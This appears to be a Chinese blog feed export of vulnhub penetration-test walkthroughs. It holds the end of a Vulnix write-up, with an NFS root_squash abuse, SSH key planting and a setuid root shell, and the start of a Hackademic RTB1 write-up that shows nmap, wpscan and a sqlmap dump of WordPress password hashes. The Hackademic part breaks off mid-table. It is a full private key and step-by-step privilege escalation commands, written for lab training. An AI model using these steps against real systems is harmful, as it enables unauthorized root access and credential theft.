class="string">qgt4/og1iqguIgEWW0EfSDbAFeDKWdFWPYuGcW+JAS7rwOMycJtofY0y6zb459HA/j6x2Z</span></span><br><span class="line"><span class="string">Gk/vWfi7NPjJTncm5EkN7PIUWljhjwuOGSwnr5QRXomU61Us3L+nljFybF3hsLSKXK/9tV</span></span><br><span class="line"><span class="string">q2VuoAPbHInVOsGAwiFMdKQAlizCNw9RkPAASSopE9LZDxZXaSz2knPX43n/yH0fTs2jMG</span></span><br><span class="line"><span class="string">VUunGXRbzbP1sNGWlrq53F1zdDFhKw2RsnwnEJqTxey1RHgNxfQ9Idkr7seqSEHpGpAAAA</span></span><br><span class="line"><span class="string">wQDzzeeHsiAXeYWVjkI8dM6Vvm7dNOvvpwm+lYkRNh8tNfBw2tGzSC5Djx0ADLZxDryhoL</span></span><br><span class="line"><span class="string">osnG4dQeSeASV3gK0qRDHJgIxJyoaLNc3udOjZ+PQuTtSHWb5Ng6NxvqghTrQepab5IgtE</span></span><br><span class="line"><span class="string">qaOkquhIr4sq0FwuHfJmbDqcIqcEc7qsfdxdKnf7+E1ii1APVl9BUNODzaJmI1kUnv12YR</span></span><br><span class="line"><span class="string">cx+OYi5qbih4O6BCVkUMqYn9nIVOfwwY+ndonxV+OyOxj5tDIAAADBAPT9intj92Pnrm0c</span></span><br><span class="line"><span class="string">ZIPUdAD68FGp9jL+ca6CTnjp/7cRrlBBCd2SUoS34Demerk2q3g0xFBlfcheUpzdPr7Wh0</span></span><br><span class="line"><span class="string">bANVoeKOztj1Z5bVrICJB3kNvhpHZQ6BdscTgiWeFHBQ8OW1z4q1umPOVnX0/PH2eEHS7s</span></span><br><span class="line"><span class="string">lDkoBPU9fuj01ZQg8hHO1xb54a7Gg9paqVvfHQnvZz9Jw3z/+B9GQK8uL2UfwrTuErarGz</span></span><br><span class="line"><span class="string">kEjeOeX/Q6OC+y+2YyBsGxmdKeeByKtwAAAMEA6LiR2x5pWbKTUTklwZrX+mPGFSaRMGow</span></span><br><span class="line"><span class="string">i8M+gykhualFDvXYRb5gtluRmbmgKvIKaijYWgTWpod2p+ghg7V5KSby/oWbWo8dM7DVeR</span></span><br><span class="line"><span class="string">DPdGhJ2xFRqHhVBJ0MugjMnZFE11UAS6hPFLYl5L1Ow54pAw0f/OBVzEGuZuVnF1i84tzx</span></span><br><span class="line"><span class="string">4r70/fHHXH8d6PYtehcL1O/wjNfjkkHONI/GxwAZzzF5Yn1h1aIB4X4B6iXkj+TJIAQcHe</span></span><br><span class="line"><span class="string">vU05iNf3ixaredAAAACXJvb3RAa2FsaQE=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa.pub </span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali</span></span><br></pre></td></tr></table></figure>

<p>然后在终端上以’vulnix’用户身份将生成的ssh-key复制到’/home/vulnix/.ssh/authorized_keys’文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir .ssh</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix/.ssh</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali&quot;</span> &gt; authorized_keys</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>

<p>然后使用ssh私匙登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh vulnix@192.168.66.18 -i id_rsa</span></span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 04:23:19 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           92</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     1</span><br><span class="line">  Memory usage: 9%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;14.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">vulnix@vulnix:~$ id</span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span><br><span class="line">vulnix@vulnix:~$ whoami</span><br><span class="line">vulnix</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/vulnix</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudo -l</span><br><span class="line">Matching <span class="string">&#x27;Defaults&#x27;</span> entries <span class="keyword">for</span> vulnix on this host:</span><br><span class="line">    env_reset, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br></pre></td></tr></table></figure>

<p>很好,vulnix可以运行命令来打开/etc/exports，不用输入密码。这是发现的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudoedit /etc/exports</span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix    *(rw,root_squash)</span><br></pre></td></tr></table></figure>

<p>还记得之前说过的有关Root squashing的内容吗？（感谢课程，Owen xD）</p>
<p>用no_root_squash替换了root_squash flag。需要作弊，因为没有vulnix的密码，而且没有sudo用户执行命令/usr/sbin/exportfs -a或计算机重新引导，就无法再次导出NFS分区，所以手动重新引导（Boooooo，真是个n0o0o0o0ob !!）</p>
<ul>
<li>root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。</li>
<li>no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）。</li>
</ul>
<p>机器重新启动后，再次安装该分区并以本地root用户身份访问。</p>
<p>检查机器是否再次启动（再次抱歉！）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ping -c 4 192.168.66.18</span></span><br><span class="line">PING 192.168.66.18 (192.168.66.18) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=1 ttl=64 time=1.04 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=2 ttl=64 time=0.279 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=3 ttl=64 time=0.482 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=4 ttl=64 time=0.492 ms</span><br><span class="line"></span><br><span class="line">--- 192.168.66.18 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3033ms</span><br><span class="line">rtt min/avg/max/mdev = 0.279/0.572/1.037/0.281 ms</span><br></pre></td></tr></table></figure>

<p>然后再次挂载分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mount 192.168.66.18:/home/vulnix /mnt/vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># cd /mnt/vulnix</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>挂载后，获得了受害者计算机本地shell的副本，并将所有权和SID更改为root：</p>
<p>在受害者的机器上，如“vulnix”：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ cp /bin/bash local_shell</span><br><span class="line">vulnix@vulnix:~$ ls</span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>在本地计算机上，以<code>root</code>身份：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/mnt/vulnix<span class="comment"># cat local_shell &gt; spawn_root_shell</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell  spawn_root_shell</span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># chmod 4777 *</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls -la</span></span><br><span class="line">总用量 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 4月  16 02:33 .</span><br><span class="line">drwxr-xr-x 3 root   root     4096 4月  15 23:00 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 4月  16 02:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 4月  15 23:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 4月  16 02:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 4月  16 02:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 4月  15 23:21 .ssh</span><br></pre></td></tr></table></figure>

<p>然后在受害人的机器上执行shell，并保留带有flag -p的原始文件的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ ls -la</span><br><span class="line">total 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .</span><br><span class="line">drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh</span><br><span class="line">vulnix@vulnix:~$ ./spawn_root_shell -p</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cd /root</span></span><br><span class="line">spawn_root_shell-4.2<span class="comment"># ls</span></span><br><span class="line">trophy.txt</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cat trophy.txt</span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>通过telnet连接收集用户名敏感信息</li>
<li>finger查看用户登录信息</li>
<li>使用rpcinfo进行RPC枚举</li>
<li>使用showmount进行NFS枚举</li>
<li>hydra爆破ssh密码</li>
<li>ssh key毒化攻击getshell</li>
<li>特定linux UID权限用户登录挂载的NFS分区</li>
<li>使用ssh私匙登录ssh</li>
<li>用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）</li>
<li>客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB1]</title>
    <url>/2019/12/11/Hackademic-RTB1/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB1<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第一个现实性黑客攻击挑战<br>下载目标并获得root。<br>尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>提权</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<p>靶机打开界面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub37.jpg"></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:01:8A:4D (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.140</span></span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp closed ssh</span><br><span class="line">80/tcp open   http    Apache httpd 2.2.15 ((Fedora))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-server-header: Apache/2.2.15 (Fedora)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">| http-vuln-cve2011-3192: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Apache byterange filter DoS</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span></span><br><span class="line"><span class="string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span></span><br><span class="line"><span class="string">|       overlapping byte ranges are requested.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2011-08-19</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.tenable.com/plugins/nessus/55976</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/49303</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span></span><br><span class="line"><span class="string">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.15: </span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span></span><br><span class="line"><span class="string">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span></span><br><span class="line"><span class="string">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-12171  6.4     https://vulners.com/cve/CVE-2017-12171</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br></pre></td></tr></table></figure>

<p>打开发现是wordpress的，直接上wpscan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">                               </span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Updating the Database ...</span></span><br><span class="line"><span class="string">[i] Update completed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string">[+] Started: Tue Dec 10 21:58:17 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.2.15 (Fedora)</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/5.3.3</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 1.5.1.1 identified (Insecure, released on 2007-09-24).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;!-- generator=&quot;wordpress/1.5.1.1&quot; --&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=1.5.1.1&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: starburst</span></span><br><span class="line"><span class="string"> | Location: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.1 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2008-09-15T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Starburst</span></span><br><span class="line"><span class="string"> | Style URI: http://starburst.weirdncrazy.com</span></span><br><span class="line"><span class="string"> | Description: A WordPress 1.5/2....</span></span><br><span class="line"><span class="string"> | Author: Claire</span></span><br><span class="line"><span class="string"> | Author URI: http://www.weirdncrazy.com/universe/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub38.jpg"></p>
<p>点击之后在后面加上单引号，明显有注入</p>
<p>直接上sqlmap,这站太烂了;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1576033944962.req -D wordpress -T wp_users --dump</span><br><span class="line"></span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| ID | user_idmode | user_ip | user_icq | user_msn | user_yim | user_url | user_aim | user_pass                        | user_login   | user_level | user_email              | user_status | user_domain | user_browser | user_nicename | user_nickname | user_lastname | user_firstname | user_registered     | user_description | user_activation_key |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| 1  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          | NickJames@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | nickjames     | NickJames     | James         | Nick           | 2010-10-25 20:40:23 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 2  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          | JohnSmith@hacked        | 0           | &lt;blank&gt;     | &lt;blank&gt;      | johnsmith     | JohnSmith     | Smith         | John           | 2010-10-25 21:25:22 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 3  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         | GeorgeMiller@hacked.com | 0           | &lt;blank&gt;     | 